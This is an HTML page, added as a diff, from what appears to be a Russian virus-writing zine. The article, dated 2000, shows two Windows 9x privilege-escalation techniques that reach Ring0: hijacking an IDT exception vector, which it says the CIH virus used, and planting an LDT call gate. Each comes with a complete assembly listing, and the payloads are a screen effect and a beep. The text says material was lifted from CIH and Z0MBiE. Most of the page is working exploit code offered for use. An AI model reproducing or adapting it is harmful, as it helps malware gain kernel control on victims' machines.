@@ -1,0 +1,260 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type"
+content="text/html; charset=windows-1251">
+<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
+<title>Top Device</title>
+</head>
+
+<body bgcolor="#B1B1B1" text="#000000" topmargin="0"
+leftmargin="3">
+
+<p><STYLE> </p>
+
+<p>INPUT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
+}</p>
+
+<p>SELECT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } </p>
+
+<p>OPTION { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } </p>
+
+<p>TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } </p>
+
+<p>FORM { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
+} <br>
+BODY { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } <br>
+P { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt }
+TABLE { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
+}TR { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } TD
+{ FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 10pt
+}TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
+8pt } A { COLOR: #005500; TEXT-DECORATION: none }A:hover {
+TEXT-DECORATION: underline } A:link { TEXT-DECORATION: none
+}A:visited { }text:unknown { FONT-SIZE: 8pt } } </STYLE> </p>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+    <tr>
+        <td>&nbsp;</td>
+        <td valign="top"><div align="center"><center><table
+        border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tr>
+                <td width="100%" bgcolor="#000000"><img
+                src="../-.gif" width="1" height="1"></td>
+            </tr>
+            <tr>
+                <td width="100%" bgcolor="#808080"><strong>07.03.2000</strong>
+                Переход в Ring0 <strong>[ULTRAS]</strong></td>
+            </tr>
+            <tr>
+                <td bgcolor="#000000"><img src="../-.gif"
+                width="1" height="1"></td>
+            </tr>
+            <tr>
+                <td><pre>
+В этой статье описываются два метода перехода в нулевое кольцо.. 
+
+<strong>IDT метод</strong>
+~~~~~~~~~
+Этот небольшой код показывает как получить доступ в Ring0 используя
+прерывание вектора в IDT(Interrupt Descriptor Table).
+Суть метода, кстати использованного в CiH, заключается в установлении
+адреса вектора одного из Exception на наш обработчик. Так как наш 
+дескриптор кода имеет уровень привелегий &quot;3&quot;, то в качестве дискриптора 
+назначения используется 28h - системный сегмент кода. Вызывая EXception 
+из программы, мы тем самым передаем управления нашему уже 
+привилегированному обработчику.
+
+<font color="#0000A0">.386p
+locals
+jumps
+.model flat, stdcall
+extrn ExitProcess : proc
+.data
+idt   df 0
+s_gate dq 0
+o_gate dw 0
+dw 028h
+dw 0EE00h
+dw 0
+.code
+start:
+mov eax, offset ring0
+mov [o_gate],ax
+shr eax,16
+mov [o_gate+6],ax
+
+; получим адрес IDT и Exeption 3
+; (номер 3 выбран от фонаря)
+
+sidt fword ptr idt
+mov ebx,dword ptr [idt+2]
+add ebx,8*3              ; адрес int3
+
+; сохраним старый адрес Exeption 3
+
+mov edi,offset s_gate
+mov esi,ebx
+movsd
+movsd
+
+; установим новый адрес exeption 3 
+
+mov edi,ebx
+mov esi,offset o_gate
+movsd
+movsd
+int 3h                   ; передаем управление на Ring0
+mov edi, ebx
+mov esi, offset s_gate
+movsd
+movsd
+
+push 0
+call ExitProcess	 ; выходим Zd0B si ZdUB
+ring0 proc
+;mov ecx,??? - heh :)
+demo:			 ; маленький видео эффект
+			 ; под названиме: улетели навсегда !!!
+mov edx,03D4h
+mov al,0Ch
+out dx,al
+mov edx,03D5h
+mov al,bh
+out dx,al
+mov edx,03D4h
+mov al,0Dh
+out dx,al
+mov edx,03D5h
+mov al,bl
+out dx,al
+inc ebx
+push ecx
+mov ecx,0000FFFFh
+loop $
+pop ecx
+loop demo
+iretd
+ring0 endp
+end start</font>
+
+<strong>LDT метод</strong>
+~~~~~~~~~
+Этот небольшой код показывает как получить доступ в Ring0 используя LDT
+(locale Descriptor Table).
+В LDT текущей задачи создается шлюз вызова (CallGate) на процедуру, 
+которую мы хотели бы выполнить с привилегиями нулевого кольца. Вместо 
+текущего дескриптора сегмента кода callgate указывается системный 
+кодовый сегмент нулевого кольца - 0029h, в результате при вызове 
+callgate код процедуры будет находиться в сегменте нулевого кольца, 
+обладая соответствующими привилегиями.
+
+
+<font color="#0000A0">.386P
+locals
+jumps
+.model flat, stdcall
+extrn ExitProcess : proc
+.data
+gdt_ df 0
+call_ dd 00h
+dw 0Fh
+o_gate dw 0
+dw 028h    ; Сегмент селектор
+dw 0EC00h
+dw 0
+.code
+
+start:
+mov eax, offset ring0
+mov [o_gate],ax
+shr eax,16
+mov [o_gate+6],ax
+
+xor eax, eax
+sgdt fword ptr gdt_
+mov ebx,dword ptr [gdt_+2]    ; Загрузим базовый адрес GDT
+sldt ax
+add ebx,eax
+; Получим адрес дискриптора в ebx
+
+mov al,[ebx+4]
+mov ah,[ebx+7]
+shl eax,16                    
+; Загрузим адрес LDT непосредственно в eax
+
+mov ax,[ebx+2]
+
+; Заносим в eax смещение дескриптора callgaTe
+
+add eax,8
+mov edi,eax
+mov esi,offset o_gate
+movsd
+movsd
+
+call fword ptr [call_] ; Запустим Ring0 процедуру
+xor eax, eax
+sub edi,8
+stosd
+stosd
+
+push 0			; выходим
+call ExitProcess
+
+ring0 proc
+pushad			; маленький звуковой эффект super beep
+mov ax,1000
+mov bx,200
+mov cx,ax
+mov al,0b6h
+out 43h,al
+mov dx,0012h
+mov ax,34dch
+div cx
+out 42h,al
+mov al,ah
+out 42h,al
+in al,61h
+mov ah,al
+or al,03h
+out 61h,al
+l1: 
+mov ecx,4680
+l2:
+loop l2
+dec bx
+jnz l1
+mov al,ah
+out 61h,al
+popad
+retf
+ring0 endp
+end start</font>
+
+
+
+thx Z0MBiE, mort
+
+некоторая информация в этой статье была выдрана из описаний z0mbie
+и из вируса cih</pre>
+                </td>
+            </tr>
+            <tr>
+                <td>&nbsp;</td>
+            </tr>
+            <tr>
+                <td>&nbsp;</td>
+            </tr>
+        </table>
+        </center></div></td>
+        <td>&nbsp;</td>
+    </tr>
+</table>
+
+<p>&nbsp;</p>
+</body>
+</html>
